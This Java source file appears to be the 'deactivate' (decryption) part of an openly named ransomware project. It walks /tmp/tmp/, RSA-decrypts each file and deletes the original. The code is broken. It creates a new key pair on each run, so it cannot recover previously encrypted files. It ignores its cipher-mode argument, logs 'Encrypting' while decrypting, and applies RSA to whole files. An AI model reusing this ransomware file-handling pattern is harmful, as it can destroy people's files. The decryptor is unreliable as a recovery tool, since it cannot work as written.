import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.Key;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.stream.Stream;
import java.nio.file.*;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.RuntimeErrorException;

class secret {
	KeyPair secret(){
		KeyPairGenerator kpg = null;
		try{
			kpg = KeyPairGenerator.getInstance("RSA");
		} catch (NoSuchAlgorithmException e) {
			throw new RuntimeException(e);
		}
		kpg.initialize(2048);
		KeyPair kp = kpg.generateKeyPair();
		return kp;
	}
	void decryptFiles(int cipherMode,PrivateKey pKey,String inputFile,String outputFile) throws Exception{
		Cipher cipher = Cipher.getInstance("RSA");
		cipher.init(Cipher.DECRYPT_MODE, pKey);
		String textString = "";
		textString = new String(Files.readAllBytes(Paths.get(inputFile)));
		byte[] rawData = Base64.getDecoder().decode(textString.getBytes());
		byte[] plainText = cipher.doFinal(rawData);
		BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));
		String plainStringText = new String(plainText); 
		writer.write(plainStringText);
		writer.close();
	}
}

class RansomwareDeactivate{
	void decryptAllFiles() throws IOException{
		secret sec = new secret();
		KeyPair kp = sec.secret();
		RansomwareDeactivate ransomware = new RansomwareDeactivate();
		List<Path> fileNames = new ArrayList<Path>();
		try{
			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
			paths.filter(Files::isRegularFile).forEach(fileNames::add);
		}
		catch (Exception e){
			System.out.println(e);
		}
		for(Path file:fileNames){
			try{
				System.out.println("Encrypting file: "+file.toString());
				String inputFile = file.toString();
				String outputFile = inputFile.substring(0, inputFile.lastIndexOf('.'));
				sec.decryptFiles(Cipher.ENCRYPT_MODE, kp.getPrivate(), inputFile,outputFile);
				File f = new File(inputFile);
				f.delete();
			}
			catch (Exception e){
				System.out.println(e);
			}
		}
	}		
}

public class project {
	void activate() throws IOException{
		RansomwareDeactivate ransomware  = new RansomwareDeactivate();
		ransomware.decryptAllFiles();
	}
}